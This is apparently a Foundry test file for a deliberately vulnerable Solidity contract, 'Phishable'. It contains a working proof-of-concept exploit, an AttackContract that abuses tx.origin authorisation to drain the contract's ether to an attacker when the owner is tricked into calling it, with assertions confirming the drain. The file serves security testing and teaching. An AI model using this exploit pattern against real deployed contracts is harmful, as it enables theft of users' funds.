
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract AttackContract {
    Phishable public target;
    address payable public attacker;

    constructor(Phishable _target, address payable _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function attack() external {
        target.withdrawAll(attacker);
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public _contractUnderTest;
    address public legitimateOwner;

    function setUp() public {
        legitimateOwner = makeAddr("legitimateOwner");
        _contractUnderTest = new Phishable(legitimateOwner);
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the legitimate owner since they are authorized
        vm.assume(caller != legitimateOwner);
        
        // Exclude precompiles
        vm.assume(caller > address(0x10));

        // --- 2. State Configuration ---
        vm.deal(caller, 1 ether);

        // --- 3. Execution & Assertion ---
        
        // Deploy an attack contract that will be called by the legitimate owner
        // This exploits the tx.origin vulnerability
        AttackContract attackContract = new AttackContract(_contractUnderTest, payable(caller));

        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        uint256 callerBalanceBefore = caller.balance;

        // The legitimate owner calls the attack contract
        // tx.origin will be legitimateOwner, but msg.sender to Phishable will be attackContract
        // This demonstrates the tx.origin vulnerability - the attacker tricks the owner
        // into calling their malicious contract, which then drains funds to the attacker
        vm.prank(legitimateOwner, legitimateOwner);
        attackContract.attack();

        // Assert that funds were drained to the arbitrary caller (attacker)
        assertEq(address(_contractUnderTest).balance, 0, "Contract should be drained");
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore, "Attacker should receive funds");
    }
}
